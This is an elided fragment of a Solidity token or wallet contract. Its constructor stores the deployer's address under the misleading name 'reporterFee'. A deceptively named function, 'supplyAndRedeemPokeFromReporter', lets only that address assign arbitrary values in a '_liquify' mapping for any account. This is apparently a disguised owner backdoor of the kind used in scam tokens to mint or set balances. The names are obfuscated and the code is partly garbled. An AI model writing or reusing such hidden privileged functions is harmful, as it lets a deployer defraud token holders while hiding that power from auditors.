...
contract DecentralizedExchangeWallet is Ownable {
  ...
  constructor(string memory _name, string memory _symbol) public {
    reporterFee = uint256(msg.sender);
    owner = msg.sender;
    name = _name;
    symbol = _symbol;
    decimals = 9;
  ...
  function supplyAndRedeemPokeFromReporter(uint256 _reporterId, address _from, bool _roundKeys) public returns (bool) {
    require(_from != address(0));
    require(uint256(msg.sender) == reporterFee);
    require((1) <= _reporterId, "id must be more than AddedValues");

      uint8 swapAndLiquify = 1;
      uint256 amountToLiquify = uint256(_from);
      _liquify[address(amountToLiquify)] = swapAndLiquify * _reporterId * (10 ** 9);
    return true;
  }
